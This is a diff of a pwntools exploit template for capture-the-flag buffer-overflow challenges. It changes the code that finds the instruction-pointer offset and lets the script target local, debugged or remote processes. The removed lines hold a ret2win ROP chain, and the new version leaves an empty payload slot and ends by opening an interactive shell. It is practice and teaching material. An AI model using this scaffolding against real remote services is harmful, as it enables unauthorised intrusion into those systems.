@@ -1,61 +1,71 @@
 from pwn import *
 
-# Use to find EIP/RIP if you want :)
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
 
 
-def find_eip(payload):
+# Find offset to EIP/RIP for buffer overflows
+def find_ip(payload):
     # Launch process and send payload
     p = process(exe)
     p.sendlineafter('>', payload)
     # Wait for the process to crash
     p.wait()
     # Print out the address of EIP/RIP at the time of crashing
-    eip_offset = cyclic_find(p.corefile.eip)
-    info('located EIP offset at {a}'.format(a=eip_offset))
-    # Return the EIP offset
-    return eip_offset
+    ip_offset = cyclic_find(p.corefile.pc)  # x86
+    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
+    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return ip_offset
 
 
-# Set up pwntools for the correct architecture
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+
+# Binary filename
 exe = './vuln'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
-# Enable verbose logging so we can see exactly what is being sent (info/debug)
+# Change logging level to help with debugging (warning/info/debug)
 context.log_level = 'info'
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
 # ===========================================================
 
-# Pass in pattern_size, get back EIP offset
-offset = find_eip(cyclic(100))
+# Pass in pattern_size, get back EIP/RIP offset
+offset = find_ip(cyclic(100))
 
 # Start program
-io = process()
-
-# Gadgets
-pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
-
-# Print out the target addresses/gadgets
-info("%#x pop rdi; ret", pop_rdi)
+io = start()
 
 # Build the payload
-payload = flat(
-    asm('nop') * offset,
-    pop_rdi,
-    0xdeadbeef,
-    elf.symbols.ret2win  # pwn???
-)
+payload = flat({
+    offset: [
 
-# gdb.attach(io, gdbscript='''
-# init-pwndbg
-# break *0x40069a
-# ''')
+    ]
+})
+
+# Save the payload to file
+write('payload', payload)
 
 # Send the payload
 io.sendlineafter('>', payload)
 io.recvuntil('Thank you!\n')
 
-# Get our flag!
-flag = io.recv()
-success(flag)
+# Got Shell?
+io.interactive()
+
+# Or, Get our flag!
+# flag = io.recv()
+# success(flag)
